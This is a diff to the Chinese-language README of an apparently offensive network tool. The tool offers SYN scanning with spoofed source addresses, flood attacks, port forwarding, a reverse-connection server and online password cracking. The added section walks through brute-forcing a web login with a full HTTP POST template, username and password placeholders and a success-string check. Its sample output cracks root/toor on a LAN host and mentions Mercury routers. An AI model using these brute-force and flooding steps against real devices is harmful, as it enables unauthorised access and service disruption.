@@ -22,7 +22,7 @@ using:arp<br/>
 获取当前主机的网络信息<br/>
 using:local<br/>
 测试主机是否连通<br/>
-using:ping %ip%<br/>
+using:ping %ip/host%<br/>
 TCP SYN 扫描主机<br/>
 using:scan %ip% [-P:[port1,port2,port3,...]] [-F:[fake_ip1,fake_ip2,...]]<br/>
 洪水攻击主机<br/>
@@ -30,7 +30,7 @@ using:flood %ip% [-P:[port1,...]] [-F:[fake_ip1,...]]<br/>
 在线破解<br/>
 using:crack %ip% %port% [%user_dictionary_path% %password_dictionary_path%]<br/>
 路由跟踪<br/>
-using:tracert %ip%<br/>
+using:tracert %ip/host%<br/>
 抓取页面<br/>
 using:getpage %ip% [-PORT:%port%] [-PATH:%path%]<br/>
 启动端口转发功能<br/>
@@ -49,14 +49,43 @@ using:quit<br/>
 	
 	crack 192.168.1.103 80
 	
-然后会提示输入表达式
+	然后会提示输入表达式
 	
-input your crack express:
+	input your crack express:
 	
-	输入数据包数据
+	输入数据包数据:
+	POST http://192.168.1.103:80/api/analays.php HTTP/1.1<br/>
+	Accept: application/x-ms-application, image/jpeg, application/xaml+xml, image/gif, image/pjpeg, application/x-ms-xbap, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*<br/>
+	Referer: http://192.168.1.103/api/analays.php<br/>
+	Accept-Language: zh-CN<br/>
+	User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)<br/>
+	Content-Type: application/x-www-form-urlencoded<br/>
+	Accept-Encoding: gzip, deflate<br/>
+	Host: 192.168.1.103<br/>
+	Content-length: %length%<br/>
+	Pragma: no-cache<br/>
+	<br/>
+	user=%username%&pass=%password%<br/>
+	
+	其中Content-length: %length% 的意思是让程序自动在此填充上下文的大小[因为这个长度是会变化的],%username% 和%password% 就是自动填充用户名和密码[这里也可以不需要全部都用,比如破解水星路由器,直接填%password% 即可启动];最后输入<end>来确认数据包填写完成,如果中间某个位置出现填写错误就输入<reset>来重新填写破解数据包,下面的输入成功判断条件也是同理..
+	
+	input your check term:
+	
+	输入成功判断条件,由于经过测试,如果输入密码成功的话,页面会返回一个包含Success 的字符串,然后把他作为破解成功的测试条件
+	Sucess
+	
+	now cracking!
+	
+	network crack - target:192.168.1.103:80
+	username:root password:toor
+	
+	破解完成
+
+###端口转发 route
+	using:route -R:[%remote_ip%,%remote_port%] -L:[[%local_ip%,]%local_port%]<br/>
 	
 
-
-
-reverse_server 是用来做反向连接用的服务端
-scanner.exe -bind 参数启动程序,可以使用putty 的Raw 方式来连接到扫描器
+##Other
+===
+####reverse_server 是用来做反向连接用的服务端
+####scanner.exe -bind 参数启动程序需要自己主动连过去,但是客户端还没写,也没什么需求,以后慢慢来..
